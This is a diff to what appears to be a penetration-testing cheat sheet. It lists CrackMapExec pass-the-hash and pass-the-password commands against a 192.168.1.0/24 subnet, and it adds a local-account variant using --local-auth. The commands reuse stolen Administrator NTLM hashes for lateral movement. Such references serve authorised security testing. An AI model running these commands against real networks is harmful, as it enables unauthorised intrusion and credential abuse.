@@ -29,6 +29,7 @@ After obtaining credential hashes, both the full hash or just the nt hash (secon
 # Pass the Hash
 cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
 cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
+cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c' --local-auth # For local accounts
 
 # Pass the Password
 cme 192.168.1.0/24 -u Administrator -d Domain -p Password
